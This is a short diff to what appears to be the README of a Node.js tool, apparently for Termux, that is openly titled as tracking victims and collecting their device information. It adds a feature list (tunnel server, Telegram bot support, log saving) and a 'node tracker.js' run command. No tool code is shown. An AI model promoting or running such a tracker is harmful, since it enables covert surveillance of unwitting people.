@@ -6,3 +6,13 @@ Track And Get Victim Device Information
 ```
 pkg install nodejs
 ```
+Feature
+[+] Export Support
+[+] Tunnel Server
+[+] TelegramBot Support
+[+] LogFile Save
+[+] Free Modification
+How To Use
+```
+node tracker.js
+```
